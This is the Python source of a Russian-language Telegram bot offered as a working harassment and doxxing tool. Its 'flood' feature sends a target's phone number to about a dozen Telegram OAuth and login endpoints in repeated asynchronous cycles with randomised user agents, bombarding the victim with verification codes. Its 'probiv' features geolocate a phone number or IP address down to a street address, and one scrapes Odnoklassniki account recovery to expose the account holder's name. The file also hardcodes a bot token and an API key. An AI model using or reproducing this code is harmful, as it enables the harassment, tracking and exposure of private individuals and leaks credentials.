import telebot
from telebot import types
import asyncio
import aiohttp
import random
import requests
import json
import urllib.request
from fake_useragent import UserAgent
from bs4 import BeautifulSoup

BOT_TOKEN = "8274678821:AAGJBACLAhqr2CsNGjP-snFhgMv6zYGcPZE"
bot = telebot.TeleBot(BOT_TOKEN)

class FloodBot:
    def __init__(self):
        self.ua = UserAgent()
        self.urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

    async def send_request(self, session, url, headers, data):
        try:
            async with session.post(url, headers=headers, data=data) as response:
                return response.status == 200
        except:
            return False

    async def start_flood(self, phone, cycles, message=None):
        success_count = 0
        total_requests = len(self.urls) * cycles
        
        if message:
            status_msg = bot.send_message(message.chat.id, 
                                        f"🚀 Запускаем флуд...\n"
                                        f"📱 Номер: {phone}\n"
                                        f"🔄 Циклов: {cycles}\n"
                                        f"📊 Всего запросов: {total_requests}")

        try:
            async with aiohttp.ClientSession() as session:
                for cycle in range(cycles):
                    if message:
                        try:
                            bot.edit_message_text(
                                f"⏳ Выполняется цикл {cycle + 1}/{cycles}\n"
                                f"✅ Успешно: {success_count}\n"
                                f"📱 Номер: {phone}",
                                message.chat.id,
                                status_msg.message_id
                            )
                        except:
                            pass

                    user_agent = self.ua.random
                    headers = {'user-agent': user_agent}
                    
                    tasks = [self.send_request(session, url, headers, {'phone': phone}) for url in self.urls]
                    results = await asyncio.gather(*tasks)
                    
                    cycle_success = sum(results)
                    success_count += cycle_success
                    
                    await asyncio.sleep(0.5)

        except Exception as e:
            if message:
                bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
            return 0

        return success_count

class ProbivBot:
    def __init__(self):
        self.ua = UserAgent()
        self.htmlweb_url = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.veriphone_url = "https://api.veriphone.io/v2/verify?phone="
        self.veriphone_key = "133DF840CE4B40AEABC341B7CA407A2D"
        self.ok_login_url = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
        self.ok_recover_url = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'

    def get_address_by_coordinates(self, latitude, longitude):
        address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
        try:
            address_response = urllib.request.urlopen(address_url)
            address_data = json.load(address_response)
            if "address" in address_data:
                return self.sort_address(address_data["address"])
            return "Адрес не найден"
        except Exception as e:
            return f"Ошибка: {e}"

    def sort_address(self, address):
        address_order = ["road", "house_number", "village", "town", "suburb", "postcode"]
        sorted_address = {}
        for key in address_order:
            if key in address:
                sorted_address[key] = address[key]
        return sorted_address

    def translate_address(self, address):
        translations = {
            "road": "Улица", "house_number": "Номер дома", "village": "Деревня",
            "town": "Городок", "suburb": "Район", "postcode": "Почтовый индекс"
        }
        translated = {}
        for key, value in address.items():
            translated[translations.get(key, key)] = value
        return translated

    def check_ok(self, phone):
        try:
            session = requests.Session()
            session.get(f'{self.ok_login_url}&st.email={phone}', timeout=10)
            request = session.get(self.ok_recover_url, timeout=10)
            soup = BeautifulSoup(request.content, 'html.parser')
            
            if soup.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}):
                account_info = soup.find('div', {'class': 'ext-registration_tx taCenter'})
                if account_info:
                    name = account_info.find('div', {'class': 'ext-registration_username_header'})
                    name = name.get_text() if name else "Неизвестно"
                    profile_info = account_info.findAll('div', {'class': 'lstp-t'})
                    profile_text = profile_info[0].get_text() if profile_info else "Нет информации"
                    return f"✅ Аккаунт найден\n👤 Имя: {name}\nℹ️ {profile_text}"
            return "❌ Аккаунт не найден"
        except:
            return "❌ Ошибка проверки"

    def probiv_po_nomeru(self, phone):
        results = []
        headers = {"User-Agent": self.ua.random}

        try:
            # HTMLWEB
            response = requests.get(self.htmlweb_url + phone, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                country = data.get("country", {}).get("name", "Неизвестно")
                region = data.get("region", {}).get("name", "Неизвестно")
                city = data.get("0", {}).get("name", "Неизвестно")
                operator = data.get("0", {}).get("oper", "Неизвестно")
                latitude = data.get("0", {}).get("latitude", "Неизвестно")
                longitude = data.get("0", {}).get("longitude", "Неизвестно")
                
                results.append(f"🌍 Страна: {country}")
                results.append(f"🏙 Регион: {region}")
                results.append(f"🏢 Город: {city}")
                results.append(f"📡 Оператор: {operator}")
                
                # Координаты и адрес
                if latitude != "Неизвестно" and longitude != "Неизвестно":
                    results.append(f"📍 Координаты: {latitude}, {longitude}")
                    address = self.get_address_by_coordinates(latitude, longitude)
                    if isinstance(address, dict):
                        translated = self.translate_address(address)
                        for key, value in translated.items():
                            results.append(f"🏠 {key}: {value}")
            else:
                results.append("❌ HTMLWEB: данные не получены")
        except Exception as e:
            results.append(f"❌ HTMLWEB ошибка: {e}")

        try:
            # Veriphone
            response = requests.get(f"{self.veriphone_url}{phone}&key={self.veriphone_key}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                phone_type = data.get("phone_type", "Неизвестно")
                valid = data.get("phone_valid", False)
                results.append(f"📞 Тип: {phone_type}")
                results.append(f"✅ Валидность: {'Да' if valid else 'Нет'}")
            else:
                results.append("❌ Veriphone: данные не получены")
        except Exception as e:
            results.append(f"❌ Veriphone ошибка: {e}")

        # Одноклассники
        ok_result = self.check_ok(phone)
        results.append(f"👤 Одноклассники: {ok_result}")

        return "\n".join(results)

    def probiv_po_ip(self, ip):
        def search_by_ip(ip):
            ip_info_url = f"https://ipinfo.io/{ip}/json"
            try:
                ip_info_response = urllib.request.urlopen(ip_info_url)
                ip_info = json.load(ip_info_response)
            except:
                return "Информация по IP не найдена."

            result = {
                "query": ip_info.get('ip', 'Неизвестно'),
                "city": ip_info.get('city', 'Неизвестно'),
                "region": ip_info.get('region', 'Неизвестно'),
                "country": ip_info.get('country', 'Неизвестно'),
                "org": ip_info.get('org', 'Неизвестно'),
                "loc": ip_info.get('loc', '')
            }

            if result["loc"]:
                latitude, longitude = result["loc"].split(",")
                result["lat"] = latitude
                result["lon"] = longitude
                address = self.get_address_by_coordinates(latitude, longitude)
                result["address"] = address

            return result

        result = search_by_ip(ip)
        if isinstance(result, str):
            return result

        response = [
            f"🌐 IP: {result.get('query', 'Неизвестно')}",
            f"🌍 Страна: {result.get('country', 'Неизвестно')}",
            f"🏙 Регион: {result.get('region', 'Неизвестно')}",
            f"🏢 Город: {result.get('city', 'Неизвестно')}",
            f"📡 Провайдер: {result.get('org', 'Неизвестно')}",
            f"📍 Координаты: {result.get('lat', 'Неизвестно')}, {result.get('lon', 'Неизвестно')}"
        ]

        if isinstance(result.get("address"), dict):
            translated = self.translate_address(result["address"])
            for key, value in translated.items():
                response.append(f"🏠 {key}: {value}")
        else:
            response.append(f"🏠 Адрес: {result.get('address', 'Неизвестно')}")

        return "\n".join(response)

flood_bot = FloodBot()
probiv_bot = ProbivBot()

@bot.message_handler(commands=['start'])
def start_message(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("📱 Флуд кодами")
    item2 = types.KeyboardButton("🔍 Пробив по номеру")
    item3 = types.KeyboardButton("🌐 Пробив по IP")
    item4 = types.KeyboardButton("❓ Помощь")
    markup.add(item1, item2, item3, item4)
    
    bot.send_message(message.chat.id,
                    "🔥 Универсальный бот\n\n"
                    "Выберите нужную функцию:",
                    reply_markup=markup)

# Флуд кодами (остается без изменений)
@bot.message_handler(func=lambda message: message.text == "📱 Флуд кодами")
def start_flood_handler(message):
    msg = bot.send_message(message.chat.id, "Введите номер телефона (только цифры, с кодом страны):")
    bot.register_next_step_handler(msg, process_phone_input)

def process_phone_input(message):
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(message.chat.id, "❌ Неверный формат номера")
        return
    bot.send_message(message.chat.id, f"📱 Номер принят: +{phone}")
    msg = bot.send_message(message.chat.id, "Введите количество циклов (1-50):")
    bot.register_next_step_handler(msg, process_cycles_input, phone)

def process_cycles_input(message, phone):
    try:
        cycles = int(message.text.strip())
        if cycles <= 0 or cycles > 50:
            bot.send_message(message.chat.id, "❌ Количество циклов должно быть от 1 до 50")
            return
        msg = bot.send_message(message.chat.id, "Введите ник (или '-' для пропуска):")
        bot.register_next_step_handler(msg, process_nick_input, phone, cycles)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Введите число!")

def process_nick_input(message, phone, cycles):
    nick = message.text.strip()
    if nick == '-':
        nick = "ARMAT"
    bot.send_message(message.chat.id, 
                    f"🎯 Параметры:\n📱 Номер: +{phone}\n🔄 Циклов: {cycles}\n👤 Ник: {nick}\n🚀 Запускаем...")
    asyncio.run(run_flood_async(phone, cycles, message))

async def run_flood_async(phone, cycles, message):
    success_count = await flood_bot.start_flood(phone, cycles, message)
    result_text = (f"📊 Флуд завершен!\n📱 Номер: +{phone}\n🔄 Циклов: {cycles}\n"
                  f"✅ Успешных запросов: {success_count}\n"
                  f"📈 Эффективность: {(success_count/(len(flood_bot.urls)*cycles))*100:.1f}%")
    bot.send_message(message.chat.id, result_text)

# Пробив по номеру
@bot.message_handler(func=lambda message: message.text == "🔍 Пробив по номеру")
def probiv_nomer_handler(message):
    msg = bot.send_message(message.chat.id, "Введите номер телефона для пробива:")
    bot.register_next_step_handler(msg, process_probiv_nomer)

def process_probiv_nomer(message):
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(message.chat.id, "❌ Неверный формат номера")
        return
    
    wait_msg = bot.send_message(message.chat.id, "🔍 Ищем информацию...")
    
    try:
        result = probiv_bot.probiv_po_nomeru(phone)
        bot.edit_message_text(f"📊 Результаты для +{phone}:\n\n{result}", 
                            message.chat.id, wait_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка: {str(e)}", message.chat.id, wait_msg.message_id)

# Пробив по IP
@bot.message_handler(func=lambda message: message.text == "🌐 Пробив по IP")
def probiv_ip_handler(message):
    msg = bot.send_message(message.chat.id, "Введите IP адрес для пробива:")
    bot.register_next_step_handler(msg, process_probiv_ip)

def process_probiv_ip(message):
    ip = message.text.strip()
    
    wait_msg = bot.send_message(message.chat.id, "🔍 Ищем информацию по IP...")
    
    try:
        result = probiv_bot.probiv_po_ip(ip)
        bot.edit_message_text(f"🌐 Результаты для {ip}:\n\n{result}", 
                            message.chat.id, wait_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка: {str(e)}", message.chat.id, wait_msg.message_id)

@bot.message_handler(func=lambda message: message.text == "❓ Помощь")
def help_handler(message):
    help_text = """
📋 Доступные функции:

📱 Флуд кодами - отправка кодов на номер
🔍 Пробив по номеру - информация о номере
🌐 Пробив по IP - геолокация по IP

⚡ Флуд кодами:
- 12+ сервисов Telegram
- Асинхронные запросы
- Случайные User-Agent

🔍 Пробив по номеру:
- Страна, город, оператор
- Тип номера и валидность
- Проверка Одноклассников

🌐 Пробив по IP:
- Геолокация
- Провайдер
- Точный адрес

⚠️ Используйте responsibly!
    """
    bot.send_message(message.chat.id, help_text)

if __name__ == "__main__":
    print("🔥 Универсальный бот запущен...")
    bot.infinity_polling()
